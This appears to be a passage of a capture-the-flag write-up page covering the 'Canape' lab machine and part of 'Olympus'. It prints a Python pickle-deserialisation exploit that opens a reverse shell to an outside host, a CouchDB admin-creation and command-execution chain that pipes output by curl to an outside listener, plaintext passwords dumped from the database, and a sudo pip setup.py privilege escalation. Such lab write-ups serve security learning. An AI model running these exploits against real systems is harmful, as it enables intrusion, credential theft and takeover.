+    else:
+    return render_template(&quot;index.html&quot;)
+
+@app.route(&quot;/&quot;)
+def index():
+    return render_template(&quot;index.html&quot;)
+
+@app.route(&quot;/quotes&quot;)
+def quotes():
+    quotes = []
+    for id in db:
+        quotes.append({&quot;title&quot;: db[id][&quot;character&quot;], &quot;text&quot;: db[id][&quot;quote&quot;]})
+    return render_template('quotes.html', entries=quotes)
+
+WHITELIST = [
+    &quot;homer&quot;,
+    &quot;marge&quot;,
+    &quot;bart&quot;,
+    &quot;lisa&quot;,
+    &quot;maggie&quot;,
+    &quot;moe&quot;,
+    &quot;carl&quot;,
+    &quot;krusty&quot;
+]
+
+@app.route(&quot;/submit&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def submit():
+    error = None
+    success = None
+
+    if request.method == &quot;POST&quot;:
+        try:
+            char = request.form[&quot;character&quot;]
+            quote = request.form[&quot;quote&quot;]
+            print &quot;Char: {}]\nQuote:{}&quot;.format(char,quote)
+            if not char or not quote:
+                error = True
+            elif not any(c.lower() in char.lower() for c in WHITELIST):
+                error = True
+            else:
+                # TODO - Pickle into dictionary instead, `check` is ready
+                #p_id = base64.b64encode(char + quote)[:10]
+                p_id = md5(char + quote).hexdigest()
+                outfile = open(&quot;/tmp/&quot; + p_id + &quot;.p&quot;, &quot;wb&quot;)
+        outfile.write(char + quote)
+        outfile.close()
+            success = True
+        except Exception as ex:
+            error = True
+
+    if error:
+        return &quot;&lt;html&gt;&lt;p1&gt;error&lt;/p1&gt;&lt;/html&gt;&quot;
+    else:
+        return &quot;&lt;html&gt;&lt;p1&gt;success&lt;/p1&gt;&lt;/html&gt;&quot;
+    #return &quot;render_template(&quot;submit.html&quot;, error=error, success=success)
+
+@app.route(&quot;/check&quot;, methods=[&quot;POST&quot;])
+def check():
+    print request.form[&quot;id&quot;]
+    path = &quot;/tmp/&quot; + request.form[&quot;id&quot;] + &quot;.p&quot;
+    data = open(path, &quot;rb&quot;).read()
+
+    if &quot;p1&quot; in data:
+        item = cPickle.loads(data)
+    else:
+        item = data
+    print item
+    return &quot;Still reviewing: &quot; + item
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p>(it may be a little modified, but the core parts are there.)
+So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: </p>
+<pre><code class="language-python">import requests
+#import base64
+from hashlib import md5
+
+PATH_REMOTE = &quot;http://10.10.10.70/{}&quot;
+PATH_LOCAL = &quot;http://192.168.0.15:5000/{}&quot;
+REMOTE = True
+
+def submit_exploit(cmd):
+    action = 'submit'
+    char = &quot;S'homer'\np1\ncos\nsystem\n(S'{cmd}'\ntRS'marge'\np1\n&quot;.format(cmd=cmd)
+    quote = '.'
+    payload = &quot;character={char}&amp;quote={quote}&quot;.format(char=char,quote=quote)
+    headers = {'Content-type': 'application/x-www-form-urlencoded'}
+    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
+    print payload
+    r = requests.post(path, data=payload, headers=headers)
+    if r.status_code == 200 and (&quot;thank you for your suggestion&quot; in r.text.lower() or 'success' in r.text.lower()): 
+        print &quot;[+] Payload successfully sent. Command: {cmd}&quot;.format(cmd=cmd)
+        #return base64.encodestring(char+quote)[:10]
+        return md5(char+quote).hexdigest()
+    else:
+        print &quot;[-] Error sending payload&quot;
+        raise Exception(&quot;Error sending payload: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}&quot;.format(http_code= r.status_code, body=r.text))
+
+def check_and_run_exploit(id_code):
+    action = 'check'
+    headers = {'Content-type': 'application/x-www-form-urlencoded'}
+    payload = &quot;id={id_code}&quot;.format(id_code=id_code)
+    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
+    r = requests.post(path, data=payload, headers=headers)
+    if r.status_code == 200: 
+        print &quot;[+] Exploit successfully executed&quot;
+        return r.text
+    else:
+        print &quot;[-] Error executing exploit&quot;
+        raise Exception(&quot;Error executing exploit: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}&quot;.format(http_code= r.status_code, body=r.text))
+
+if __name__ == &quot;__main__&quot;:
+    cmd = &quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.255\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'&quot;
+    id_code = submit_exploit(cmd)
+    check_and_run_exploit(id_code)
+</code></pre>
+<p>Two disclaimers:</p>
+<ul>
+<li>The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).</li>
+<li>The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.</li>
+</ul>
+<p>After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).</p>
+<p><img alt="reverse shell" src="../images/canape/reverse_shell.png" /></p>
+<p>Although, we have a reverse shell, the user running the HTTP server is <strong>www-data</strong>, so we need to escalate privileges and log in as other user. 
+Once inside the machine, my first move was to run <strong>LinEnum.sh</strong>. Once of the outputs of it was the following: </p>
+<p><img alt="troll" src="../images/canape/troll.png" /></p>
+<p>I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a <strong>BIG</strong> troll.</p>
+<p>Analyzing the applications running on the system and its ports, I found the <strong>couchdb</strong> running in localhost. 
+I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: </p>
+<pre><code class="language-bash">$&gt; curl -X GET http://localhost:5984
+{&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;2.0.0&quot;,&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
+</code></pre>
+<p>I started playing around a little more and figured it out how to list dbs and docs inside them: </p>
+<pre><code class="language-bash">$&gt; curl -X GET http://localhost:5984/_all_dbs
+[&quot;_global_changes&quot;,&quot;_metadata&quot;,&quot;_replicator&quot;,&quot;_users&quot;,&quot;passwords&quot;,&quot;simpsons&quot;]
+$&gt; curl -X GET http://localhost:5984/simpsons/_all_docs
+{&quot;total_rows&quot;:7,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;f0042ac3dc4951b51f056467a1000dd9&quot;,&quot;key&quot;:&quot;f0042ac3dc4951b51f056467a1000dd9&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-fbdd816a5b0db0f30cf1fc38e1a37329&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a61000d86&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a61000d86&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-7b8ec9e1c3e29b2a826e3d14ea122f6e&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a6100183d&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a6100183d&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-e522ebc6aca87013a89dd4b37b762bd3&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a61002980&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a61002980&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-3bec18e3b8b2c41797ea9d61a01c7cdc&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a61003068&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a61003068&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-3d2f7da6bd52442e4598f25cc2e84540&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a61003a2a&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a61003a2a&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-4446bfc0826ed3d81c9115e450844fb4&quot;}},
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a6100451b&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a6100451b&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-3f6141f3aba11da1d65ff0c13fe6fd39&quot;}}
+$&gt; curl -X GET http://localhost:5984/passwords/_all_docs
+{&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not a server admin.&quot;}
+</code></pre>
+<p>So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this <strong>EXCELENT</strong> <a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">blogpost</a>. Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).</p>
+<p>I changed (just the names) a little bit the PoC of the blog and executed against the db: </p>
+<pre><code class="language-bash">$&gt; curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
+  &quot;type&quot;: &quot;user&quot;,
+  &quot;name&quot;: &quot;tsuller&quot;,
+  &quot;roles&quot;: [&quot;_admin&quot;],
+  &quot;roles&quot;: [],
+  &quot;password&quot;: &quot;tsuller&quot;
+}'
+{&quot;ok&quot;:true,&quot;id&quot;:&quot;org.couchdb.user:tsuller&quot;,&quot;rev&quot;:&quot;1-0b547bb36cb610ec21d9571312f6e20c&quot;}
+</code></pre>
+<p>Yes! Seems that it worked! Lets check:</p>
+<pre><code class="language-bash">$&gt; curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs
+{&quot;total_rows&quot;:4,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;}}
+]}
+</code></pre>
+<p>YES! Worked. Lets dump the content of each doc:</p>
+<pre><code class="language-bash">$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;_rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;,&quot;item&quot;:&quot;ssh&quot;,&quot;password&quot;:&quot;0B4jyA0xtytZi7esBNGp&quot;,&quot;user&quot;:&quot;&quot;}
+$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;_rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;,&quot;item&quot;:&quot;couchdb&quot;,&quot;password&quot;:&quot;r3lax0Nth3C0UCH&quot;,&quot;user&quot;:&quot;couchy&quot;}
+$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;_rev&quot;:&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;,&quot;item&quot;:&quot;simpsonsfanclub.com&quot;,&quot;password&quot;:&quot;h02ddjdj2k2k2&quot;,&quot;user&quot;:&quot;homer&quot;}
+$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;_rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;,&quot;user&quot;:&quot;homerj0121&quot;,&quot;item&quot;:&quot;github&quot;,&quot;password&quot;:&quot;STOP STORING YOUR PASSWORDS HERE -Admin&quot;}
+</code></pre>
+<p>If we pay atenttion to the <strong>home</strong> directory, we'll just find <strong>homer</strong> user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the <strong>ssh</strong> one) worked, and seconds later I was able to get the user flag: </p>
+<p><img alt="user_flag" src="../images/canape/user_flag.png" /></p>
+<h3 id="root_5">Root</h3>
+<p>To start, I ran again the <strong>LinEnum.sh</strong> but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.</p>
+<p>In some moment, I thought that the couchdb was running as <strong>root</strong>. I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also <strong>couchy</strong> (look the docs of the <strong>password</strong> db) was admin. 
+Thanks to this <a href="https://www.octority.com/2017/05/16/from-couchdb-admin-to-remote-code-execution/">blogpost</a> first, and a little help from <a href="https://stackoverflow.com/questions/37401355/cant-create-server-admin-in-couchdb">this</a> also I was able to successfully execute commands: </p>
+<pre><code class="language-bash">curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '&quot;whoami | curl http://10.10.14.255:5555 -d @-&quot;'  --insecure
+curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure
+curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{&quot;_id&quot;:&quot;770855a97726d5666d70a22173005c77&quot;}' --insecure
+curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}' -H 'Content-Type: application/json' --insecure
+</code></pre>
+<p>Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the <strong>whoami</strong> wasn't root but homer. I must have confused with some other running process. </p>
+<p>I continued looking for some interesting thing, but nothing showed up. </p>
+<p>During that search, I issued: </p>
+<pre><code class="language-bash">sudo -l 
+</code></pre>
+<p>And this was the output:
+![sudoers][./images/canape/sudoers.png]</p>
+<p>For those not very familiar, this means that the user <strong>homer</strong> can run as <strong>root</strong> the command <strong>pip install</strong> without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?</p>
+<p><strong>PIP</strong> is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called <strong>setup.py</strong> which is the one in charge of really installing the package in your enviroment (virtual env or general env). </p>
+<p>So my idea was to, download a compressed version of package that already exists (I pick <strong>request</strong> because is my favourite lib), modify it's code, compress it again and try to install it using sudo:</p>
+<ul>
+<li>Downloaded the source code from <a href="https://pypi.org/project/requests/">here</a>.</li>
+<li>Decompressed it.</li>
+<li>Added the following line to the setup.py:</li>
+</ul>
+<pre><code class="language-python">os.system('cat /root/root.txt &gt; /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')
+</code></pre>
+<p>(I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)
+* Compressed it again.
+* Served it in a python serve so you can copy it to the machine .
+* Executed:</p>
+<pre><code class="language-bash">sudo /usr/bin/pip install blablabla.tar.gz
+</code></pre>
+<ul>
+<li>Read the flag from <strong>/tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p</strong></li>
+<li>Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.</li>
+</ul>
+<p><img alt="root" src="../images/canape/root.png" /></p>
+<h2 id="olympus">Olympus</h2>
+<h3 id="user_6">User</h3>
+<p>Found a weird X-debug header. Keep googling for it and found that there is a metasploit module for it. 
+Get reverse shell as www-data. </p>
+<p>Metasploit module: nix/http/xdebug_unauth_exec</p>
+<p>cat the etc/passwd/ see the user zeus. Went to its home directory and find airgeddon directory </p>
+<p>Use the command download to get it. </p>
+<p>Find a capture directory wiht a pcap 
+The pcap was about a connection to some wifi endpoint, deauth packets,probe requests. .etc. 
+So clearly maybe we can bruteforce the password of the wifi. </p>
+<p>https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/</p>
+<p>Used this command: 
+aircrack-ng -a 2 -b f4:ec:38:ab:a8:a9 -w ~/Tools/john-1.8.0-jumbo-1/run/wordlists/rockyou.txt captured.cap</p>
+<p>Password found.. Now? </p>
+<p>See traffic nothng yet..</p>
+<p>GO back to the reverse shell.. upload a php one in order to later on updateit to tty</p>
+<p>I tried to continue with this thing by installing the dropbox client in my machine. I though thay maybe allowing syncing I'll receive be able to read some directory or something like that... But no luck . </p>
+
+  <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
